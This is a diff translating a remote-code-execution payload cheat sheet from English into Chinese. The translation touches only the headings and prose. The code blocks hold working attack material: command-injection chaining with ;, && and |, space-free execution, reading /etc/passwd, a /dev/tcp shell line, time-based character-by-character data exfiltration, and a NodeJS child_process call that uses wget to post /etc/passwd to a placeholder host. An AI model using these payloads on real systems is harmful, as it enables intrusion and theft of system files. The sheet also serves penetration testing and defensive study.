@@ -1,9 +1,9 @@
-# Remote Code Execution
-Remote code execution is a security vulnerability that allows an attacker to execute codes from a remote server.
+# 远程代码执行
+远程代码执行时一种允许攻击者执行远程服务器上代码的漏洞。
 	
 
 ## Exploits
-Normal code execution, execute the command and voila :p
+普通的远程代码执行, 执行命令以及 and voila :p
 ```
 cat /etc/passwd 
 root:x:0:0:root:/root:/bin/bash 
@@ -12,14 +12,14 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 ```
 
-Code execution by chaining commands
+通过链接命令的代码执行
 ```
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
 ```
 
-Code execution without space
+无空格的代码执行
 ```
 swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
 root:x:0:0:root:/root:/bin/bash
@@ -40,8 +40,8 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
-## Time based data exfiltration
-Extracting data : char by char
+## 基于时间的数据渗漏
+提取数据 : 逐字符
 ```
 swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 real	0m5.007s
@@ -54,11 +54,11 @@ user	0m0.000s
 sys	0m0.000s
 ```
 
-## Environment based 
-NodeJS Code execution
+## 基于环境的代码执行
+NodeJS代码执行
 ```
 require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
 
-## Thanks to
+## 感谢
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
